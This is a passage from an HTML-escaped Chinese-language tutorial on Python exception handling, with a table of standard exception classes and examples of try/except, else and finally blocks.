&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 类型不能相加，触发异常&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;python标准异常&#34;&gt;&lt;a href=&#34;#python标准异常&#34; class=&#34;headerlink&#34; title=&#34;python标准异常&#34;&gt;&lt;/a&gt;python标准异常&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;异常名称&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;BaseException&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;所有异常的基类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;SystemExit&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;解释器请求退出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;KeyboardInterrupt&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;用户中断执行(通常是输入^C)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Exception&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;常规错误的基类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;StopIteration&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;迭代器没有更多的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;GeneratorExit&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;生成器(generator)发生异常来通知退出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;StandardError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;所有的内建标准异常的基类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;ArithmeticError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;所有数值计算错误的基类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;FloatingPointError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;浮点计算错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;OverflowError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;数值运算超出最大限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;ZeroDivisionError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;除(或取模)零 (所有数据类型)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;AssertionError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;断言语句失败&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;AttributeError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;对象没有这个属性&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;EOFError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;没有内建输入,到达EOF 标记&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;EnvironmentError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;操作系统错误的基类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;IOError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;输入/输出操作失败&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;OSError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;操作系统错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;WindowsError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;系统调用失败&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;ImportError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;导入模块/对象失败&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;LookupError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;无效数据查询的基类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;IndexError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;序列中没有此索引(index)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;KeyError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;映射中没有这个键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;MemoryError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;内存溢出错误(对于Python 解释器不是致命的)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;NameError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;未声明/初始化对象 (没有属性)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;UnboundLocalError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;访问未初始化的本地变量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;ReferenceError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;弱引用(Weak reference)试图访问已经垃圾回收了的对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;RuntimeError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;一般的运行时错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;NotImplementedError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;尚未实现的方法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;SyntaxError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Python 语法错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;IndentationError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;缩进错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;TabError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Tab 和空格混用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;SystemError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;一般的解释器系统错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;TypeError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;对类型无效的操作&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;ValueError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;传入无效的参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;UnicodeError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Unicode 相关的错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;UnicodeDecodeError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Unicode 解码时的错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;UnicodeEncodeError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Unicode 编码时错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;UnicodeTranslateError&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Unicode 转换时错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Warning&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;警告的基类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;DeprecationWarning&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;关于被弃用的特征的警告&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;FutureWarning&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;关于构造将来语义会有改变的警告&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;OverflowWarning&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;旧的关于自动提升为长整型(long)的警告&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;PendingDeprecationWarning&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;关于特性将会被废弃的警告&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;RuntimeWarning&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;可疑的运行时行为(runtime behavior)的警告&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;SyntaxWarning&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;可疑的语法的警告&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;UserWarning&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;用户代码生成的警告&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;异常处理&#34;&gt;&lt;a href=&#34;#异常处理&#34; class=&#34;headerlink&#34; title=&#34;异常处理&#34;&gt;&lt;/a&gt;异常处理&lt;/h3&gt;&lt;h5 id=&#34;try-except&#34;&gt;&lt;a href=&#34;#try-except&#34; class=&#34;headerlink&#34; title=&#34;try/except&#34;&gt;&lt;/a&gt;try/except&lt;/h5&gt;&lt;p&gt;基本格式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    执行代码
&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    异常时执行的代码&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;请输入一个数字: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; ValueError&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;您输入的不是数字，请再次尝试输入！&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
请输入一个数字: qq
您输入的不是数字，请再次尝试输入！
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;首先执行try字句&lt;/li&gt;
&lt;li&gt;没有异常忽略except，结束try&lt;/li&gt;
&lt;li&gt;如果有异常，忽略try语句发生异常后面的语句，执行与except中与try发生的异常相符的语句&lt;/li&gt;
&lt;li&gt;如果没有相符的，那么这个异常将会传递给上层的 try 中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一个except语句同时处理多个异常，这些异常将被放在一个括号里成为一个元组&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;RuntimeError&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; TypeError&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; NameError&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;pass&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一个 try 语句可能包含多个except子句，分别来处理不同的特定的异常。最多只有一个分支会被执行。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys

&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;myfile.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;readline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; OSError &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; err&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;OS error: {0}&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;err&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; ValueError&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Could not convert data to an integer.&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Unexpected error:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exc_info&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;try-except…else&#34;&gt;&lt;a href=&#34;#try-except…else&#34; class=&#34;headerlink&#34; title=&#34;try/except…else&#34;&gt;&lt;/a&gt;try/except…else&lt;/h5&gt;&lt;p&gt;基本格式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    执行代码
&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    异常时执行的代码
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    没有异常执行的代码&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; arg &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; IOError&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;cannot open&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;has&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;readlines&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;lines&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;try-finally-语句&#34;&gt;&lt;a href=&#34;#try-finally-语句&#34; class=&#34;headerlink&#34; title=&#34;try-finally 语句&#34;&gt;&lt;/a&gt;try-finally 语句&lt;/h5&gt;&lt;p&gt;基本格式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    执行代码
&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    异常时执行的代码
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    没有异常执行的代码
&lt;span class=&#34;token keyword&#34;&gt;finally&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    无论如何都要执行的代码&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    runoob&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; AssertionError &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; error&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;file.log&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            read_data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; FileNotFoundError &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; fnf_error&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fnf_error&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;finally&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;这句话，无论异常是否发生都会执行。&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
这句话，无论异常是否发生都会执行。
Traceback (most recent call last):
  File xxxx in &amp;lt;module&amp;gt;
    runoob()
NameError: name &#39;runoob&#39; is not defined
